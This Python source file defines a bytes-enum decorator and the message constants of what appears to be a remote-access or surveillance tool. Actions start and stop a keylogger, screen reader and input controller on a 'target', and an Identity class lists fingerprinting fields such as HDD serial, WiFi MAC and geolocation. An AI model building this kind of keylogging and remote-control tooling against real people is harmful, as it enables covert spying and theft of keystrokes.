from typing import Type


def bytes_enum(cls: Type) -> Type:
    r"""
        Convert all constant `int` values from `cls` to `bytes`
        and return a new class having these `bytes` values.
        All constants in `cls` should be of type `int` and from 0 to 255

        Usage example::
        >>> @bytes_enum
        ... class MyClass:
        ...     A = 1
        ...     B = 2
        >>> MyClass.A
        b'\x01'
        >>> MyClass.B
        b'\x02'
    """
    constant_attrs = list(filter(lambda x: x.isupper(), dir(cls)))
    values = set(map(lambda attr: getattr(cls, attr), constant_attrs))
    if len(values) != len(constant_attrs):
        raise ValueError("All values in enum should be unique")
    for i in constant_attrs:
        num: int = getattr(cls, i)
        if not isinstance(num, int):
            raise Exception(f"Expected constant to be 'int' "
                            f"found '{num.__class__}'")
        if num < 0 or num > 255:
            raise Exception(f"expected constant to be from "
                            f"0 to 255, found '{num}'")
        delattr(cls, i)
        setattr(cls, i, num.to_bytes(1, "big"))
    return cls


@bytes_enum
class Reasons:
    ALREADY_CONNECTED = 0x0
    MAIN_NOT_CONNECTED = 0x1


@bytes_enum
class Status:
    TARGET_WAITING = 0x0
    TARGET_RUNNING = 0x1


@bytes_enum
class Actions:
    DISCONNECT = 0x0
    SEND_TARGET_LIST = 0x1
    WAIT = 0x2
    RESTART_TARGET = 0x3
    STOP_WATCHING = 0x4
    SEND_CONNECTED_COMPONENTS = 0x5

    START_ALL_COMPONENTS = 0x10
    START_SCREEN_READER = 0x11
    START_CONTROLLER = 0x12
    START_KEYLOGGER = 0x13

    STOP_ALL_COMPONENTS = 0x20
    STOP_SCREEN_READER = 0x21
    STOP_CONTROLLER = 0x22
    STOP_KEYLOGGER = 0x23


@bytes_enum
class ClientTypes:
    TARGET = 0x00
    TARGET_SCREEN_READER = 0x01
    TARGET_CONTROLLER = 0x02
    TARGET_KEYLOGGER = 0x03

    WATCHER = 0x10
    WATCHER_SCREEN_READER = 0x11
    WATCHER_CONTROLLER = 0x12
    WATCHER_KEYLOGGER = 0x20



@bytes_enum
class ControlDevice:
    CONTROL_MOUSE = 0x0
    CONTROL_KEYBOARD = 0x1


@bytes_enum
class ImageSendModes:
    DIRECT_JPG = 0x0  # send the whole new image
    DIFF = 0x1        # subtract one image from another and send diff
    CHANGES = 0x2     # send the changed areas of image


# not making the ones below as bytes_enum as that would make transmitted message longer
class Identity:
    USER = 0x0
    HOST = 0x1
    PLATFORM = 0x2
    HDD_SERIAL = 0x3
    WIFI_MAC = 0x4
    GEOLOCATION = 0x5


class DeviceEvents:
    MOUSE_UP = 0x0
    MOUSE_DOWN = 0x1
    MOUSE_MOVE = 0x2

    KEY_UP = 0x10
    KEY_DOWN = 0x11
